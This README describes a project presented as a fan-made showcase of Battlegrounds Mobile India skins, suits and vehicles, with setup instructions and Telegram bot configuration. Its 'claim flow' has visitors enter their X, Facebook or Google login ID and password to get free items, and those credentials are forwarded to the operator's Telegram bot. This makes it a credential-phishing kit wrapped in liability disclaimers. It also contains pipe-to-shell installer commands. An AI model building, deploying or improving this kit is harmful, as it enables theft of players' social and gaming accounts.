# 🎮 BGMI Vault — Mythic Skins, X-Suit, Mummy Suit & More

The ultimate Battlegrounds Mobile India (BGMI) showcase website. Explore mythic gun skins, the legendary X-Suit, the cursed Mummy Suit, mythic vehicles, airdrop crate opening animations, and more — all presented in a premium, dark, gaming-themed UI.

---

## ⚠️ DISCLAIMER — READ CAREFULLY

> **This project is a fan-made, non-commercial showcase created for educational and demonstration purposes only.**

- **Not affiliated with, endorsed by, or associated with KRAFTON, Inc., PUBG Studios, Tencent, or any of their subsidiaries or affiliates.**
- "Battlegrounds Mobile India", "BGMI", "PUBG", and all related marks, logos, and assets are trademarks of their respective owners.
- **The creator of this project is NOT responsible for any misuse, damage, loss, or legal consequences arising from the use, modification, or distribution of this software.**
- **The creator is NOT liable for any legal action, claims, or proceedings brought against any party using this code.**
- Users are solely responsible for ensuring their use of this project complies with all applicable laws and terms of service of the respective trademark holders.
- **By downloading, using, or modifying this project, you agree that the creator bears no responsibility or liability whatsoever.**

If you are a rights holder and believe any content infringes your intellectual property, please contact the repository owner to have it removed.

---

## 📦 What's Included

- **Next.js 16** (App Router) + **TypeScript 5** + **Tailwind CSS 4** + **shadcn/ui**
- **Prisma ORM** with SQLite (no external database needed)
- **Telegram Bot integration** — every claim sends a formatted message to your Telegram bot
- **Framer Motion** animations — airdrop crate opening, success bursts, hover effects
- **Responsive design** — works on mobile, tablet, and desktop
- **Dark gaming theme** with gold/red/mythic accent colors

---

## 🚀 Quick Start (One-Click Install)

### Windows
1. Unzip `bgmi-vault-oneclick.zip` to any folder
2. **Double-click `BGMI-Vault-Start.bat`**
3. Press any key when prompted
4. Your browser opens automatically at `http://localhost:3000`

### macOS / Linux
1. Unzip `bgmi-vault-oneclick.zip`
2. Open Terminal in that folder
3. Run: `./BGMI-Vault-Start.sh`
4. Your browser opens at `http://localhost:3000`

The start script automatically:
1. Installs the **Bun** runtime (if not already installed)
2. Runs `bun install` to fetch all dependencies
3. Runs `bun run db:push` to create the SQLite database
4. Starts the Next.js dev server on port 3000
5. Opens your browser

---

## 🔧 Manual Setup (Advanced)

If the one-click script doesn't work, follow these steps manually:

### Step 1: Install Bun

**macOS / Linux:**
```bash
curl -fsSL https://bun.sh/install | bash
```

**Windows (PowerShell as Administrator):**
```powershell
irm bun.sh/install.ps1 | iex
```

Verify the installation:
```bash
bun -v   # should print a version number
```

### Step 2: Install Dependencies

```bash
bun install
```

### Step 3: Configure the `.env` File

Open the `.env` file in a text editor and set your Telegram bot credentials:

```env
DATABASE_URL=file:./db/custom.db
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

**How to get your Telegram bot token:**
1. Open Telegram and message [@BotFather](https://t.me/BotFather)
2. Send `/newbot` and follow the prompts
3. Copy the bot token (looks like `123456789:ABCdefGHIjklMNOpqrSTUvwxYZ`)

**How to get your chat ID:**
1. Message [@userinfobot](https://t.me/userinfobot) on Telegram
2. It will reply with your numeric chat ID (e.g. `6721548185`)

### Step 4: Set Up the Database

```bash
bun run db:push
```

This creates the SQLite database file at `db/custom.db` with the `Claim` table.

### Step 5: Start the Dev Server

```bash
bun run dev
```

Open **http://localhost:3000** in your browser.

---

## ⚙️ Configuration

### `.env` File

| Variable | Description | Example |
|----------|-------------|---------|
| `DATABASE_URL` | Path to the SQLite database file | `file:./db/custom.db` |
| `TELEGRAM_BOT_TOKEN` | Your Telegram bot token from @BotFather | `00000000:AAFBot-...` |
| `TELEGRAM_CHAT_ID` | Your Telegram chat ID from @userinfobot | `00000000` |

### Changing the Bot Token / Chat ID

Edit the `.env` file, then restart the dev server (`bun run dev`).

---

## 📂 Project Structure

```
bgmi-vault/
├── src/
│   ├── app/
│   │   ├── api/
│   │   │   └── telegram/
│   │   │       ├── send/route.ts      # POST: send claim to Telegram
│   │   │       ├── status/route.ts    # GET: delivery stats
│   │   │       ├── recent/route.ts    # GET: recent 10 claims
│   │   │       └── history/route.ts   # GET: full claim history
│   │   ├── globals.css                # Dark gaming theme
│   │   ├── layout.tsx                 # Root layout
│   │   └── page.tsx                   # Main page
│   ├── components/
│   │   ├── bgmi/                      # All BGMI sections
│   │   │   ├── navbar.tsx             # Top navigation
│   │   │   ├── hero.tsx               # Hero section
│   │   │   ├── gun-skins.tsx          # Mythic gun skins grid
│   │   │   ├── x-suit.tsx             # X-Suit showcase
│   │   │   ├── mummy-suit.tsx         # Mummy Suit showcase
│   │   │   ├── more-suits.tsx         # Pharaoh + Cyber Samurai
│   │   │   ├── vehicles.tsx           # Mythic vehicles
│   │   │   ├── crate-cta.tsx          # Crate opening section
│   │   │   ├── crate-open-modal.tsx   # Airdrop opening animation
│   │   │   ├── claim-button.tsx       # Reusable claim button
│   │   │   ├── claim-success-modal.tsx# Animated success screen
│   │   │   ├── login-modal.tsx        # Provider login + credentials
│   │   │   ├── footer.tsx             # Footer
│   │   │   └── bgmi-data.ts           # All item data
│   │   └── ui/                        # shadcn/ui components
│   └── lib/
│       ├── db.ts                      # Prisma client
│       ├── telegram.ts                # Telegram bot helper
│       └── i18n.tsx                   # Language provider (EN/HI)
├── prisma/
│   └── schema.prisma                  # Database schema (Claim table)
├── public/
│   └── images/                        # BGMI logo + generated images
├── .env                               # Environment variables
├── package.json
├── BGMI-Vault-Start.bat               # Windows one-click start
├── BGMI-Vault-Run.bat                 # Windows quick run
├── BGMI-Vault-Start.sh                # macOS/Linux one-click start
└── README.md                          # This file
```

---

## 🎯 Features

### Player-Facing
- **Mythic Gun Skins** — 7 legendary weapons with stats, kill effects, upgrade levels
- **X-Suit** — flagship mythic suit with evolution track
- **Mummy Suit** — cursed pharaoh suit with abilities
- **More Suits** — Pharaoh Conqueror & Cyber Samurai
- **Mythic Vehicles** — Dragon Emperor car, Voltage Surge bike, Skyfall Phoenix plane
- **Airdrop Crate Opening** — animated crate drop → impact → burst → reward reveal
- **Claim Flow** — pick provider (X/Facebook/Google) → enter credentials → send to Telegram
- **Animated Success Screen** — burst, sparkles, delivery confirmation
- **Multi-language** — English + Hindi support
- **Fully responsive** — mobile-first design

### Backend
- **Telegram Bot delivery** — every claim sends a richly-formatted HTML message
- **SQLite database** — stores all claims with delivery status
- **API routes** — `/api/telegram/send`, `/status`, `/recent`, `/history`
- **No login persistence** — users re-enter credentials on every claim (security)

### Telegram Message Format
```
🎮 BGMI VAULT — NEW CLAIM 🎮
━━━━━━━━━━━━━━━━━━━━

🦾 Item: X-Suit
🏷 Type: SUIT
💸 Price: FREE (0 UC)

👤 PLAYER DETAILS
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
🎮 IGN: BGMI Player
⭐ Level: 75
🆔 UID: 5123456789

🔐 LOGIN METHOD
┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
𝕏 Provider: x
👤 Login ID: @ghostops
🔑 Password: ********

🕒 Time: ... IST
━━━━━━━━━━━━━━━━━━━━
✅ Deliver this item to the player's in-game mail within 24h.
```

---

## 🛠 Available Scripts

| Command | Description |
|---------|-------------|
| `bun run dev` | Start dev server on port 3000 |
| `bun run build` | Build for production |
| `bun run start` | Start production server |
| `bun run lint` | Run ESLint checks |
| `bun run db:push` | Push Prisma schema to database |
| `bun run db:generate` | Regenerate Prisma client |
| `bun run db:migrate` | Create a database migration |
| `bun run db:reset` | Reset database (⚠️ deletes all data) |

---

## 🖼 Generating Images

The gun/suit/vehicle images are AI-generated. To regenerate them:

```bash
bun run scripts/gen-images.mjs
```

This uses the `z-ai-web-dev-sdk` to generate all images. Each takes ~60 seconds. They'll be saved to `public/images/`. The BGMI logo (`logo.png`) is included in the package.

---

## 🔄 Updating the Telegram Message Format

To change the message format that's sent to Telegram, edit the `buildClaimMessage` function in `src/lib/telegram.ts`.

---

## 🧯 Troubleshooting

### "Bun not found" on Windows
Open PowerShell as Administrator and run:
```powershell
irm bun.sh/install.ps1 | iex
```
Then re-run `BGMI-Vault-Start.bat`.

### Port 3000 already in use
Close other apps using port 3000, or edit `package.json` and change `-p 3000` to `-p 3001`.

### Database errors
```bash
bun run db:reset   # ⚠️ deletes all claims
bun run db:push    # recreate the schema
```

### Telegram messages not arriving
1. Verify your bot token in `.env` is correct
2. Make sure you've started a conversation with your bot (send `/start`)
3. Test the bot directly:
   ```bash
   curl "https://api.telegram.org/botYOUR_TOKEN/getMe"
   ```
4. Check the status endpoint:
   ```bash
   curl http://localhost:3000/api/telegram/status
   ```

### TypeScript / lint errors
```bash
bun run lint       # check for issues
bunx tsc --noEmit  # type-check without building
```

---

## 🛑 Stopping the Server

Click the terminal/command window and press **Ctrl + C**.

---

## ❓ FAQ

**Q: Do I need to install Node.js?**
A: No, only Bun is required (the start script installs it automatically).

**Q: Where is the database stored?**
A: In `db/custom.db` — a SQLite file. No external database server needed.

**Q: Can I change the bot token later?**
A: Yes — edit the `.env` file and restart the server.

**Q: Is this an official BGMI product?**
A: No. This is a fan-made showcase. See the disclaimer at the top.

**Q: Can users claim unlimited times?**
A: Yes — there is no claim limit. Each claim sends a new message to Telegram.

---

## 📜 License

This project is provided **as-is, without any warranty**. You are free to use, modify, and distribute it for personal/educational purposes.

**The creator is not responsible for any legal action, damages, or consequences arising from the use of this software.**

"Battlegrounds Mobile India", "BGMI", "PUBG", and all related trademarks belong to their respective owners.

---

## 🙏 Credits

- **Framework:** [Next.js](https://nextjs.org/) 16
- **UI:** [shadcn/ui](https://ui.shadcn.com/) + [Tailwind CSS](https://tailwindcss.com/)
- **Animations:** [Framer Motion](https://www.framer.com/motion/)
- **Database:** [Prisma](https://www.prisma.io/) + SQLite
- **Runtime:** [Bun](https://bun.sh/)
- **Icons:** [Lucide](https://lucide.dev/)
- **Bot API:** [Telegram Bot API](https://core.telegram.org/bots/api)

---

*By using this project, you acknowledge that you have read and understood the disclaimer above, and you agree that the creator bears no responsibility or liability for any use of this software.*
